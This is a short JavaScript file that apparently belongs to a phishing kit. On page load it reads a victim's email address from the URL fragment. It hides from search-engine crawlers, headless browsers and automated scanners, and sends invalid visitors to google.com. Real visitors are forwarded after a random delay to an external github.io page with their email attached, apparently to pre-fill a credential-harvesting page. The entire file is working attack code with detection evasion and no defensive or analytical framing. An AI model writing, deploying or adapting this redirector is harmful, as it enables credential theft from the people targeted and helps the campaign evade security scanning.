(function () {
  function getEmailFromHash() {
    const hash = window.location.hash;
    if (!hash) return null;
    return decodeURIComponent(hash.replace("#", ""));
  }

  function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  }

  function isBot() {
    const ua = navigator.userAgent;
    const botPatterns = [
      /bot/i, /crawler/i, /spider/i, /crawling/i,
      /google/i, /bing/i, /yahoo/i, /facebook/i,
      /duckduckgo/i, /baidu/i, /yandex/i
    ];

    if (botPatterns.some(bot => bot.test(ua))) return true;
    if (navigator.webdriver) return true; // Headless check
    if (window.outerWidth === 0 || window.outerHeight === 0) return true;

    return false;
  }

  function redirectUser(email) {
    const delay = Math.floor(Math.random() * 1000) + 1000;
    setTimeout(() => {
      window.location.href = "https://naturaldeco.github.io#" + encodeURIComponent(email);
    }, delay);
  }

  window.addEventListener("load", () => {
    if (isBot()) {
      console.log("Bot detected, no redirect.");
      return;
    }

    const email = getEmailFromHash();
    if (!email || !isValidEmail(email)) {
      window.location.href = "https://google.com";
      return;
    }

    redirectUser(email);
  });
})();

